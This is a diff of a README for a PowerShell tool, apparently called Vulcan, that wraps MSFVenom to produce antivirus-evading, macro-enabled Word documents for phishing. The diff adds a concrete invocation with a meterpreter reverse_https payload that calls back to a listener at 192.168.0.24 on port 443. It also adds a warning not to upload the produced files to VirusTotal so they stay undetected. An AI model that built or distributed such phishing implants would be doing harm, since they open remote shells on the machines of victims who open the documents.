@@ -3,17 +3,21 @@
 [![Language](https://img.shields.io/badge/Lang-PowerShell-blue.svg)](https://docs.microsoft.com/en-gb/powershell/)
 [![License](https://img.shields.io/badge/License-BSD%203-red.svg)](https://opensource.org/licenses/BSD-3-Clause)
 
-## A collection of `PowerShell` scripts to simplify everyday phishing. 🎣
+## A `PowerShell` script that simplify life and therefore phishing. 🎣
 
-For now, a simple `PowerShell` script to automate the entire process of generating consistent and efficient macro-enabled `Word` documents that actually manage to evade - *at the time of writing* - most AVs, including `Windows Defender`. This script is a wrapper around [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) - made possible thanks to [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) and [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros).
+A `PowerShell` script to automate the creation of consitent and efficient macro-enabled `Word` documents. At the time of writing, the `indirect` template yields great results at evading most AVs, including `Windows Defender`. This script is a wrapper around [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) - made possible thanks to [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) that use templates to create `Word` implant with a one-liner.
 
-More features might follow, but this repository mainly serves as a place for the community to build and improve upon the existing. 🐺
+The community is greatly encourage toward building and improving upon the existing features. 🐺
 
 ### ⚠️ Do not submit the produced files to VirusTotal.
 
+## Features
+
+- `VBA` templating -> do not hesitate to submit more templates.
+- Fine-tuning of *bloody* `VBA` line-continuation using `-Treshold`.
+
 ## Requirements
 
-- [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
 - [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) with [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) installed.
 
 ## Installation
@@ -34,7 +38,7 @@ More features might follow, but this repository mainly serves as a place for the
 3. Run `vulcan`:
 
     ```powershell
-    Invoke-Vulcan -BadAssMacros $BadAssMacros -Payload $Payload -PayloadOptions $PayloadOptions
+    Invoke-Vulcan -Payload "meterpreter/reverse_https" -PayloadOptions "LHOST=192.168.0.24 LPORT=443 EXITFUNC=thread" -Template "./assets/templates/indirect.vba"
     ```
 
 > Although obvious, `$BadAssMacros`, `$Payload` and `$PayloadOptions` are placeholders for your own values... 🙄
@@ -65,7 +69,6 @@ Please submit all `PRs` on the GitHub [pull requests tracker](https://github.com
 
 Give to Caesar what belongs to Caesar:
 
-- [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
 - [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
 
 ## License
